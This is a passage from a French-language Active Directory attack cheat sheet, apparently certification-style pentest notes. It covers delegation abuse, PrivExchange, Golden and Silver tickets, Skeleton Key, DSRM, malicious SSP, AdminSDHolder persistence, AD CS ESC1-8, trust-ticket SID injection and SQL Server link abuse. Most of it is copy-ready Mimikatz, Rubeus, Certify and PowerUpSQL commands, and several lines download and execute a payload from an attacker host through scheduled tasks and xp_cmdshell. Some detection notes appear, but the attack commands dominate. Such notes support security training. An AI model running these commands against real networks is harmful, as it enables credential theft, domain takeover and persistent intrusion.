kekeo# tgs::s4u /tgt:<TGT_kirbi> /user:Administrator@domain.local /service:cifs/target.domain.local

# 3. Inject ticket
Invoke-Mimikatz -Command '"kerberos::ptt <ticket.kirbi>"'
```

**Attack avec Rubeus:**
```powershell
# All-in-one - S4U attack  
.\Rubeus.exe s4u /user:serviceaccount /rc4:<ntlm_hash> /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt

# Ou avec AES256
.\Rubeus.exe s4u /user:serviceaccount /aes256:<aes_key> /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
```

⚠️ **Alternative Service Names**: Ticket valide pour n'importe quel SPN sur le même host
```powershell
# Si delegation autorisée vers time/target.domain.local
# Peut utiliser pour: CIFS, HTTP, HOST, LDAP, etc.
.\Rubeus.exe s4u /user:serviceaccount /rc4:<hash> /impersonateuser:Administrator /msdsspn:time/target.domain.local /altservice:cifs,http,host,ldap /ptt
```

**Méthode 2: Constrained Delegation sans Protocol Transition:**

Quand "Trust this user for delegation to specified services only" SANS "Use any authentication protocol":
- Requiert TGT forwardable de user à impersonner (pas S4U2Self)
- S4U2Proxy seulement

```powershell
# Nécessite TGT forwardable (ex: via Unconstrained Delegation ou obtenu légitimement)
kekeo# tgs::s4u /tgt:<user_TGT> /user:Administrator@domain.local /service:cifs/target.domain.local
```

### Resource-Based Constrained Delegation (RBCD)

**Concept**: Contrairement à Constrained Delegation (permissions sur account délégué), RBCD = permissions sur RESSOURCE/SERVICE. Attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` sur objet ressource.

**Conditions:**
- Contrôle sur computer object (GenericWrite, GenericAll, WriteProperty, WriteDACL)
- OU permissions pour créer computer object (`ms-DS-MachineAccountQuota` > 0, défaut = 10)

**Enumération:**
```powershell
# PowerView - Chercher msDS-AllowedToActOnBehalfOfOtherIdentity
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.ObjectAceType -match "msDS-AllowedToActOnBehalfOfOtherIdentity"}

# AD Module
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | ?{$_."msDS-AllowedToActOnBehalfOfOtherIdentity" -ne $null}
```

**Attack - Abus GenericWrite/GenericAll sur computer:**
```powershell
# 1. Créer fake computer account (ou utiliser existant sous contrôle)
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount AttackerPC -Password $(ConvertTo-SecureString 'AttackerPC123!' -AsPlainText -Force)

# 2. Configurer RBCD sur target computer
Set-ADComputer -Identity targetserver -PrincipalsAllowedToDelegateToAccount AttackerPC$

# OU avec PowerView
$ComputerSid = Get-DomainComputer -Identity AttackerPC -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer -Identity targetserver | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}

# 3. Effectuer S4U attack avec AttackerPC
.\Rubeus.exe hash /password:AttackerPC123! /user:AttackerPC$ /domain:domain.local
.\Rubeus.exe s4u /user:AttackerPC$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/targetserver.domain.local /ptt
```

⚠️ **Explication**: 
- `msDS-AllowedToActOnBehalfOfOtherIdentity` définit qui peut déléguer vers cette ressource
- En configurant notre fake computer dedans, on peut faire S4U pour n'importe quel user
- Pas besoin SeEnableDelegationPrivilege (config est sur ressource, pas délégant)

**Nettoyage:**
```powershell
# Supprimer RBCD config
Set-ADComputer -Identity targetserver -PrincipalsAllowedToDelegateToAccount $null

# Supprimer fake computer
Remove-ADComputer -Identity AttackerPC$ -Confirm:$false
```

### Abusing MS Exchange

**Concept**: Exchange Servers ont permissions très élevées dans AD, notamment:
- WriteDACL sur domain object (peut accorder DCSync rights)
- Mailbox access

**PrivExchange Attack (CVE-2019-0686):**
```powershell
# 1. Setup relay NTLM vers LDAP
python ntlmrelayx.py -t ldap://dc.domain.local --escalate-user student1

# 2. Trigger authentification Exchange Server
python privexchange.py -u student1 -p Password123 -d domain.local -ah attacker_ip exchange.domain.local

# 3. student1 obtient DCSync rights
```

⚠️ **Explication**: 
- `privexchange.py` abuse Exchange Web Services (EWS) API
- Force Exchange Server à s'authentifier vers attacker
- Relay NTLM vers LDAP pour modifier ACL et accorder DCSync à notre user

**Après PrivExchange - DCSync:**
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

**Mailbox Access:**
Si compromission Exchange Server ou admin Exchange:
```powershell
# PowerShell Exchange Management Shell
# Accorder full mailbox access
Add-MailboxPermission -Identity 'targetuser' -User 'attacker' -AccessRights FullAccess

# Lire emails
# Import PST ou accès via Outlook Web Access (OWA)
```

---

## ⚡ PHASE 5: DOMAIN PERSISTENCE

### Golden Ticket

**Concept**: Forger TGT avec KRBTGT hash = accès complet domaine pour 10 ans (ou durée spécifiée)

**Obtenir KRBTGT hash:**
```powershell
# DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'

# OU depuis DC
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername DC
```

**Créer Golden Ticket:**
```powershell
# Mimikatz - Créer ticket
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:domain.local /sid:<domain_SID> /krbtgt:<krbtgt_ntlm_hash> /id:500 /groups:512,513,518,519,520 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

# Paramètres importants:
# /User: Username à impersonner
# /domain: FQDN  
# /sid: SID du domaine (sans RID final)
# /krbtgt: NTLM hash du krbtgt account
# /id: RID du user (500 = Administrator)
# /groups: Group RIDs (512=Domain Admins, 519=Enterprise Admins)
# /ptt: Inject ticket immédiatement
```

**OU créer ticket offline puis utiliser:**
```powershell
# Créer .kirbi
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:<hash> /endin:600 /renewmax:10080 /ticket:golden.kirbi"'

# Injecter plus tard
Invoke-Mimikatz -Command '"kerberos::ptt golden.kirbi"'
```

**Rubeus:**
```powershell
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:domain.local /sid:S-1-5-21-... /user:Administrator /id:500 /groups:512,513,518,519,520 /ptt
```

⚠️ **Golden Ticket Features**:
- Valide même si password krbtgt changé (tant que hash pas rotaté)
- Bypass smart card authentication requirements  
- Peut spécifier groups membership arbitraire
- Pas validé contre AD (tant que bien formé)

**Détection:**
- Event 4768 (TGT Request): Regarder source workstation = anomalie si TGT créé hors DC
- Account validation flag dans ticket (Golden = 0x40000, Normal = 0x60000)
- Impossible à détecter parfaitement si attacker connait tous détails

### Silver Ticket

**Concept**: Forger TGS (Service Ticket) pour service spécifique avec hash du service account

**Différences vs Golden:**
- Scope: Service spécifique seulement (vs tout domain avec Golden)
- Hash requis: Service account hash (vs KRBTGT)
- Validation: Jamais validé avec DC (seulement par service)
- Plus furtif (pas contact DC)

**Services intéressants:**
- **CIFS** (File Share): `cifs/server.domain.local`
- **HTTP** (Web, PS Remoting): `http/server.domain.local`
- **HOST** (Task Scheduler, services): `host/server.domain.local`  
- **LDAP** (AD queries): `ldap/dc.domain.local`
- **MSSQL**: `mssqlsvc/server.domain.local:1433`
- **WinRM**: `wsman/server.domain.local`

**Créer Silver Ticket:**
```powershell
# Mimikatz - CIFS service
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:domain.local /sid:<domain_SID> /target:server.domain.local /service:cifs /rc4:<service_account_ntlm> /id:500 /groups:512,513,518,519,520 /ptt"'

# HTTP service
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:domain.local /sid:<domain_SID> /target:server.domain.local /service:http /rc4:<machine_account_ntlm> /ptt"'

# Multiple services (ex: machine account)
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:domain.local /sid:<domain_SID> /target:dc.domain.local /service:HOST /rc4:<dc_machine_hash> /ptt"'
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:domain.local /sid:<domain_SID> /target:dc.domain.local /service:LDAP /rc4:<dc_machine_hash> /ptt"'
```

⚠️ **Machine Account Hash**: Suffixe `$` dans username. Hash peut être obtenu via:
- DCSync: `Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\server$"'`
- Local dump sur machine: `Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'`

**Rubeus:**
```powershell
.\Rubeus.exe silver /service:cifs/server.domain.local /rc4:<hash> /sid:S-1-5-21-... /ldap /user:Administrator /domain:domain.local /ptt
```

**Exemples d'abus:**

**CIFS - File Access:**
```powershell
# Créer silver ticket
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:domain.local /sid:<SID> /target:server.domain.local /service:cifs /rc4:<hash> /ptt"'

# Accès file share
dir \\server.domain.local\C$
```

**HOST - Scheduled Task:**
```powershell
# Silver ticket HOST
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:domain.local /sid:<SID> /target:server.domain.local /service:host /rc4:<hash> /ptt"'

# Créer scheduled task
schtasks /create /S server.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Task1" /TR "powershell.exe -c 'iex (iwr http://attacker/payload.ps1)'"
schtasks /Run /S server.domain.local /TN "Task1"
```

**LDAP - DCSync (si hash DC):**
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:domain.local /sid:<SID> /target:dc.domain.local /service:ldap /rc4:<dc_machine_hash> /ptt"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

### Skeleton Key

**Concept**: Patch LSASS sur DC pour ajouter master password qui fonctionne pour tous users

```powershell
# Installer Skeleton Key (requiert DA sur DC)
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc.domain.local

# Password par défaut = "mimikatz"
# Tous users peuvent maintenant s'authentifier avec ce password
Enter-PSSession -Computername dc.domain.local -Credential domain\Administrator
# Password: mimikatz
```

⚠️ **Limitations**:
- Requiert reboot DC pour persister (sinon reset au reboot)
- Détectable facilement (modification LSASS memory)
- Incompatible avec smart card authentication

**Détection:**
- Event 7045: Service installation "Kernel Mode Driver" (si driver utilisé)
- Event 4673: Sensitive Privilege Use (SeDebugPrivilege)
- LSASS memory monitoring

**Mitigation:**
```powershell
# Forcer LSASS en Protected Process (empêche modifications)
New-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name RunAsPPL -Value 1 -Verbose
# Reboot requis

# Vérifier après reboot
Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}
```

### DSRM (Directory Services Restore Mode)

**Concept**: Compte local Administrator sur DC avec password séparé, utilisé pour maintenance AD

**Dump DSRM password:**
```powershell
# Sur DC (requiert DA)
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
# Premier hash = DSRM Administrator local
```

**Permettre DSRM logon (normalement safe mode seulement):**
```powershell
# Sur DC - Modifier DsrmAdminLogonBehavior
# 0 = Disabled (défaut)
# 1 = Local logon seulement
# 2 = Network logon enabled
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# OU
Enter-PSSession -Computername dc
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

**Utiliser DSRM credentials:**
```powershell
# PTH avec DSRM hash
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:DC01 /user:Administrator /ntlm:<dsrm_hash> /run:powershell.exe"'

# Accès DC
ls \\dc01\c$
```

⚠️ **Explication**: 
- DSRM = compte LOCAL, donc `/domain:` = nom DC (pas domain)
- Très furtif car rarement monitored
- Password DSRM rarement changé

**Détection:**
- Event 4657: Registry value modified (`DsrmAdminLogonBehavior`)
- Logon Type 3 (Network) avec account name "Administrator" + source = DC

### Custom SSP (Security Support Provider)

**Concept**: Injecter DLL malveillante dans LSASS pour logger credentials

**Mimikatz mimilib.dll:**
```powershell
# 1. Drop mimilib.dll sur DC
Copy-Item C:\AD\Tools\mimilib.dll \\dc\C$\Windows\System32\

# 2. Injecter dans LSASS (runtime - non persistent)
Invoke-Mimikatz -Command '"misc::memssp"' -ComputerName dc

# OU Méthode persistante - Modifier registry
# Ajouter mimilib à Security Packages
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\SecurityPackages | Select -Expand SecurityPackages
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name "SecurityPackages" -Value $packages
# Reboot DC requis

# 3. Credentials logged dans C:\Windows\System32\kiwissp.log
```

⚠️ **Détection**:
- Event 4657: Registry value modified (SecurityPackages)
- DLL loading events dans LSASS
- File creation monitoring (kiwissp.log)

### AdminSDHolder

**Concept**: Template ACL propagé automatiquement chaque 60min vers protected groups (Domain Admins, etc.) par SDProp process

**Protected Groups:**
- Account Operators
- Administrators  
- Backup Operators
- Domain Admins
- Enterprise Admins
- Print Operators
- Read-only Domain Controllers
- Replicator
- Schema Admins
- Server Operators

**Abus - Persistence:**
```powershell
# Ajouter Full Control pour notre user sur AdminSDHolder
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity student1 -Rights All -Verbose

# Après 60min (ou force)
# Tous membres protected groups hériteront de ces permissions
Invoke-SDPropagator -showProgress -timeoutMinutes 1

# Maintenant student1 a GenericAll sur tous Domain Admins
# Peut reset passwords, modifier attributs, etc.
```

⚠️ **Explication**:
- SDProp tourne chaque 60min (customizable via LDAP)
- Modif AdminSDHolder = propagée automatiquement
- Persiste même après suppression de DA membership

**Abus Rights:**
```powershell
# Si Full Control sur DA account
Set-DomainUserPassword -Identity administrator -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# OU ajouter à groupe
Add-DomainGroupMember -Identity 'Domain Admins' -Members student1
```

**Détection:**
- Monitor ACL changes sur CN=AdminSDHolder
- Event 5136: Directory Service Object Modified
- Alert si non-standard principals dans AdminSDHolder ACL

### DCSync Rights via ACL

**Concept**: Accorder Replication permissions pour permettre DCSync sans DA

```powershell
# Accorder DCSync rights à user
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity student1 -Rights DCSync -Verbose

# student1 peut maintenant DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

⚠️ **ACL Rights pour DCSync**:
- DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
- DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)

**Détection:**
- Event 5136: Directory Service Object Modified
- Monitor ACL changes sur domain root object
- Alert si Replication rights accordés à non-admin accounts

---

## 🌲 PHASE 6: CROSS-DOMAIN ATTACKS

### Active Directory Certificate Services (AD CS)

**Concepts:**
- **CA (Certificate Authority)**: Emet certificats
- **Certificate Template**: Définit usage et permissions
- **Enterprise CA**: Intégrée AD, templates accessibles via LDAP
- **Standalone CA**: Non intégrée AD

**Enumération AD CS:**
```powershell
# Certify (C#)
.\Certify.exe cas
.\Certify.exe find
.\Certify.exe find /vulnerable

# Trouver vulnerable templates
.\Certify.exe find /vulnerable /currentuser
```

**Certutil (built-in):**
```cmd
certutil -TCAInfo  # Liste CAs
certutil -v -dstemplate  # Liste templates
```

### AD CS Attack - ESC1 (Template Misconfiguration)

**Conditions:**
- Template permet SAN (Subject Alternative Name)
- Client authentication EKU
- Enrollment rights pour low-priv user

**Attack:**
```powershell
# 1. Chercher vulnerable template
.\Certify.exe find /vulnerable

# 2. Request certificate avec SAN = Administrator
.\Certify.exe request /ca:CA-SERVER\CA-NAME /template:VulnTemplate /altname:Administrator

# 3. Convertir .pem vers .pfx
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# 4. Request TGT avec certificat
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:certpass /ptt
```

### AD CS Attack - ESC3 (Enrollment Agent Template)

**Conditions:**
- Template avec "Certificate Request Agent" EKU
- Autre template permettant enrollment "on behalf of"

**Attack:**
```powershell
# 1. Request Enrollment Agent certificate
.\Certify.exe request /ca:CA /template:EnrollmentAgent

# 2. Utiliser pour request autre certificat au nom de user privilégié
.\Certify.exe request /ca:CA /template:User /onbehalfof:domain\Administrator /enrollcert:agent.pfx /enrollcertpw:pass

# 3. Authentification
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:pass /ptt
```

### AD CS Attack - ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)

**Condition:** Flag `EDITF_ATTRIBUTESUBJECTALTNAME2` enabled sur CA

```powershell
# Check si flag enabled
.\Certify.exe cas

# Si enabled, TOUT template peut être abusé pour SAN
.\Certify.exe request /ca:CA /template:AnyTemplate /altname:Administrator
```

### AD CS Attack - ESC7 (Vulnerable CA Permissions)

**Condition:** ManageCA ou ManageCertificates rights sur CA

**Abus ManageCA:**
```powershell
# 1. Enable EDITF_ATTRIBUTESUBJECTALTNAME2
.\Certify.exe setconfig /ca:CA /config:EDITF_ATTRIBUTESUBJECTALTNAME2 /restart

# 2. Exploit comme ESC6
```

**Abus ManageCertificates:**
```powershell
# Approuver pending certificate requests
.\Certify.exe issue /ca:CA /id:<request_id>
```

### AD CS Attack - ESC8 (NTLM Relay to HTTP Enrollment)

**Condition:** HTTP enrollment endpoint accessible (Web Enrollment)

```bash
# 1. Setup NTLM relay vers HTTP enrollment
python ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Coerce authentication (Printerbug, PetitPotam, etc.)
python printerbug.py domain/user:pass@target attacker_ip

# 3. Obtenir certificat DC
# 4. Authentification
.\Rubeus.exe asktgt /user:DC01$ /certificate:dc.pfx /ptt
```

### AD CS - Escalation vers Enterprise Admin

**Méthode 1: Request certificat root domain**
```powershell
# Si CA dans child domain mais template accessible depuis child
.\Certify.exe request /ca:CHILD-CA\CA /template:VulnTemplate /altname:rootdomain\Administrator /domain:rootdomain.local

# TGT root domain
.\Rubeus.exe asktgt /user:rootdomain\Administrator /certificate:cert.pfx /dc:rootdc.rootdomain.local /ptt
```

**Méthode 2: NTAuthCertificates abuse**
Si contrôle sur CA ou root de l'AD:
- Modifier `NTAuthCertificates` container pour ajouter malicious CA
- Emettre certificats arbitraires

---

## 🔄 PHASE 7: CROSS-DOMAIN ATTACKS (CHILD TO PARENT)

### Trust Ticket Attack (Extra SID Injection)

**Concept**: Exploiter trust entre child et parent domain en forgeant TGT inter-domain avec SID Filtering bypass

**SID History & SID Filtering:**
- **SID History**: Attribut permettant migration users entre domains
- **SID Filtering**: Protection empêchant SID History abuse cross-forest
- **Parent-Child**: SID Filtering DÉSACTIVÉ par défaut (trust implicite)

**Obtenir Trust Key:**
```powershell
# Sur DC child domain (requiert DA child)
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName childdc
# OU
Invoke-Mimikatz -Command '"lsadump::dcsync /user:child$"'
# child$ = inter-domain trust account
```

**Forger TGT inter-domain avec SID injection:**
```powershell
# Mimikatz - Injecter SID Enterprise Admins (519) du parent
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:child.parent.local /sid:<child_domain_SID> /sids:<parent_domain_SID>-519 /rc4:<trust_key_rc4> /service:krbtgt /target:parent.local /ticket:trust.kirbi"'

# Paramètres critiques:
# /sid: SID du CHILD domain  
# /sids: SID Enterprise Admins (S-1-5-21-<parent_SID>-519)
# /rc4: Trust key (NTLM hash du child$ account)
# /service: krbtgt
# /target: PARENT domain

# Utiliser ticket
.\Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/parentdc.parent.local /dc:parentdc.parent.local /ptt
```

**Rubeus - All-in-one:**
```powershell
.\Rubeus.exe golden /rc4:<trust_key> /domain:child.parent.local /sid:<child_SID> /sids:<parent_SID>-519 /user:Administrator /service:krbtgt /target:parent.local /nowrap

# Puis request TGS pour service parent
.\Rubeus.exe asktgs /ticket:<base64_ticket> /service:cifs/parentdc.parent.local /dc:parentdc.parent.local /ptt
```

⚠️ **SIDs à injecter pour Enterprise Admin**:
- **Enterprise Admins**: S-1-5-21-<parent_SID>-519
- Fonctionne SEULEMENT child → parent (pas cross-forest sans trust modification)

**Vérification accès:**
```powershell
ls \\parentdc.parent.local\C$
Enter-PSSession -ComputerName parentdc.parent.local
```

### KRBTGT Hash Attack (Child to Parent)

**Alternative**: Utiliser KRBTGT hash du child domain pour forger ticket avec SID injection

```powershell
# Obtenir KRBTGT child
Invoke-Mimikatz -Command '"lsadump::dcsync /user:child\krbtgt"'

# Golden Ticket avec SID injection
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:child.parent.local /sid:<child_SID> /sids:<parent_SID>-519 /krbtgt:<krbtgt_hash> /ticket:child2parent.kirbi"'

# Request TGS pour parent
.\Rubeus.exe asktgs /ticket:child2parent.kirbi /service:cifs/parentdc.parent.local /dc:parentdc.parent.local /ptt
```

---

## 🌲🌲 PHASE 8: CROSS-FOREST ATTACKS

### Forest Trust Basics

**Types:**
- **External Trust**: Entre domains de forests différents, non-transitive
- **Forest Trust**: Entre forest roots, transitive (dans limites des 2 forests)

**SID Filtering:**
- **Enabled par défaut** sur forest trusts
- Filtre SIDs du SID History si pas du trusted forest
- Empêche Extra SID injection

**Selective Authentication:**
- Sécurité additionnelle sur trusts
- Requiert "Allowed to Authenticate" explicit sur chaque ressource
- Rarement utilisé (complexe à gérer)

### Kerberoast Cross-Forest

**Concept**: Kerberoast users dans trusted forest (requiert TGT du trusted forest)

**Enumération:**
```powershell
# Lister users avec SPN dans trusted forest
Get-DomainUser -SPN -Domain trustedforest.local

# AD Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Server trustedforest.local -Properties ServicePrincipalName
```

**Attack:**
```powershell
# Rubeus - Kerberoast dans trusted forest
.\Rubeus.exe kerberoast /domain:trustedforest.local /dc:trusteddc.trustedforest.local /outfile:hashes.txt

# PowerView
Get-DomainUser -SPN -Domain trustedforest.local | Get-DomainSPNTicket -Domain trustedforest.local
```

### Unconstrained Delegation Cross-Forest

**Enumération:**
```powershell
# Chercher Unconstrained Delegation dans trusted forest
Get-DomainComputer -Unconstrained -Domain trustedforest.local
```

Si compromission serveur Unconstrained Delegation dans trusted forest:
- Peut capturer TGTs des users de SA propre forest qui s'authentifient
- Technique identique à intra-domain

### Abusing Trust Flow (TGT Delegation)

**Concept**: Users peuvent traverser trust pour accéder ressources. TGT peut être capturé si traverse serveur Unconstrained Delegation.

**Attack Flow:**
```
User (forestA) → Resource (forestB via trust)
  ↓
TGT forestA envoyé à DC forestB
  ↓
Si serveur Unconstrained Delegation intercepte → TGT captured
```

**Monitor:**
```powershell
# Sur serveur Unconstrained Delegation dans forestB
.\Rubeus.exe monitor /interval:5 /filteruser:forestA_user
```

### Foreign Security Principals (FSP)

**Concept**: Objects représentant security principals d'un external/trusted domain. Utilisés pour group membership cross-forest.

**Enumération FSPs:**
```powershell
# PowerView - Lister FSPs
Get-DomainObject -SearchBase "CN=ForeignSecurityPrincipals,DC=domain,DC=local"

# Avec domain source
Get-DomainObject -SearchBase "CN=ForeignSecurityPrincipals,DC=domain,DC=local" | %{$_.cn} | Convert-SidToName
```

**Chercher groups contenant FSPs:**
```powershell
# Groups où external users sont membres
Find-ForeignGroup -Domain domain.local

# OU manuel
Get-DomainGroup | %{Get-DomainGroupMember -Identity $_.distinguishedname | ?{$_.MemberSID -like '*-*-*-*-*'}}
```

**Attack:**
Si user compromis dans trustedforest est membre groupe dans currentforest via FSP:
```powershell
# Utiliser credentials du trusted user
$SecPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('trustedforest\user', $SecPassword)

# Accéder ressource dans current forest
Enter-PSSession -ComputerName server.currentforest.local -Credential $Cred
```

### ACL Attacks Cross-Forest

**Enumération ACLs cross-forest:**
```powershell
# Chercher ACLs où trusted forest principals ont rights
Find-InterestingDomainAcl -Domain currentforest.local | ?{$_.IdentityReferenceName -match "trustedforest"}

# Specific user cross-forest
Get-DomainObjectAcl -Identity "CN=Administrator,CN=Users,DC=currentforest,DC=local" -ResolveGUIDs | ?{$_.SecurityIdentifier -match "<trustedforest_SID>"}
```

**Attack:**
Si trusted forest user a GenericAll sur current forest object:
```powershell
# Même techniques que intra-domain ACL abuse
# Utiliser credentials trusted forest user
$Cred = Get-Credential trustedforest\user
Add-DomainObjectAcl -TargetIdentity administrator -PrincipalIdentity attacker -Rights ResetPassword -Credential $Cred -Domain currentforest.local
```

---

## 🗄️ PHASE 9: ABUSING SQL SERVER

### SQL Server in Active Directory

**Liens courants:**
- SQL Servers souvent liés à domain accounts (pas LocalSystem)
- **Database Links**: Connexions entre SQL servers (même cross-domain/forest)
- **Impersonation**: EXECUTE AS pour changer execution context

**Enumération SQL Servers:**
```powershell
# PowerUpSQL
Import-Module .\PowerUpSQL.psd1

# Découverte auto
Get-SQLInstanceDomain -Verbose

# Via SPN enumeration
Get-SQLInstanceDomain | Get-SQLConnectionTest

# AD Module
Get-ADComputer -Filter {ServicePrincipalName -like "*MSSQLSvc*"} -Properties ServicePrincipalName | select Name, ServicePrincipalName
```

### Database Links Enumeration

```powershell
# PowerUpSQL - Trouver database links
Get-SQLServerLink -Instance sqlserver.domain.local -Verbose

# Crawler (suit links récursivement)
Get-SQLServerLinkCrawl -Instance sqlserver.domain.local -Verbose

# SQL Query manuel
SELECT * FROM master..sysservers
```

### Attack via Database Links

**Concept**: Database links configurés avec high-priv accounts permettent exécution commandes remote

**Test accès:**
```powershell
# PowerUpSQL
Get-SQLQuery -Instance sqlserver -Query "SELECT SYSTEM_USER"

# Via link
Get-SQLQuery -Instance sqlserver -Query "SELECT SYSTEM_USER" -QueryTarget linkedserver
```

**Exécution OS Command:**
```powershell
# Enable xp_cmdshell
Get-SQLQuery -Instance sqlserver -Query "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE"

# Execute command
Get-SQLQuery -Instance sqlserver -Query "EXEC xp_cmdshell 'whoami'"

# Via database link
Get-SQLQuery -Instance sqlserver -Query "EXEC ('EXEC sp_configure ''show advanced options'',1; RECONFIGURE;') AT linkedserver"
Get-SQLQuery -Instance sqlserver -Query "EXEC ('EXEC sp_cmdshell ''whoami''') AT linkedserver"
```

**PowerUpSQL Invoke-SQLOSCmd:**
```powershell
# Direct
Invoke-SQLOSCmd -Instance sqlserver -Command "whoami"

# Via crawler (suit links automatiquement)
Invoke-SQLOSCmd -Instance sqlserver -Command "powershell -enc <base64>" -Crawl
```

### Attack Chain Example

```powershell
# 1. Découverte
$Servers = Get-SQLInstanceDomain

# 2. Test connexions
$Accessible = $Servers | Get-SQLConnectionTest | ?{$_.Status -eq "Accessible"}

# 3. Enumérer links
$Links = $Accessible | Get-SQLServerLink

# 4. Crawler pour trouver chains
$LinkCrawl = Get-SQLServerLinkCrawl -Instance sqlserver.domain.local

# 5. Exec via chain
Invoke-SQLOSCmd -Instance sqlserver.domain.local -Command "powershell iex (iwr http://attacker/payload.ps1)" -Crawl
```

### SQL Server Impersonation

**Concept**: `EXECUTE AS` permet impersonation d'autre user, incluant sysadmin

**Enumérer impersonations:**
```sql
-- Trouver qui peut impersonate
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE'

-- PowerUpSQL
Invoke-SQLAuditPrivImpersonateLogin -Instance sqlserver -Verbose
```

**Attack:**
```sql
-- Impersonate sysadmin
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER

-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options',1; RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE

-- Execute
EXEC xp_cmdshell 'whoami'
```

**PowerUpSQL:**
```powershell
Invoke-SQLAuditPrivImpersonateLogin -Instance sqlserver -Exploit -Verbose
```

### Cross-Forest via SQL Links

**Scenario**: Database link depuis currentforest SQL vers trustedforest SQL

```powershell
# Enumérer links cross-forest
Get-SQLServerLinkCrawl -Instance sqlserver.currentforest.local | ?{$_.DatabaseLinkName -like "*trustedforest*"}

# Execute via chain
Invoke-SQLOSCmd -Instance sqlserver.currentforest.local -Command "powershell iex (iwr http://attacker/payload.ps1)" -Crawl -Verbose
```

⚠️ **Explication**: Links souvent configurés avec high-priv accounts pour simplifier. Pas SID Filtering sur SQL authentication.

---

## 🎭 PHASE 10: PAM TRUST ABUSE

### Privileged Access Management (PAM) Trust

**Concept**: 
- **Bastion/Red Forest**: Forest dédié admin de haute sécurité
- **Production Forest**: Forest production managé par bastion
- **Shadow Principals**: Principals créés dans bastion forest, mappés à SIDs des protected groups (DA, EA) dans production forest
- Permet admin production avec credentials bastion SEULEMENT

**Caractéristiques PAM Trust:**
- Type: Forest Trust  
- SID Filtering: **Désactivé** (`SIDFilteringQuarantined = False`)
- `ForestTransitive = True`
- Shadow Principals dans `CN=Shadow Principal Configuration,CN=Services,CN=Configuration`

### Enumération PAM Trust

```powershell
# Depuis DC bastion - Check PAM Trust  
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}

# Enumérer Shadow Principals
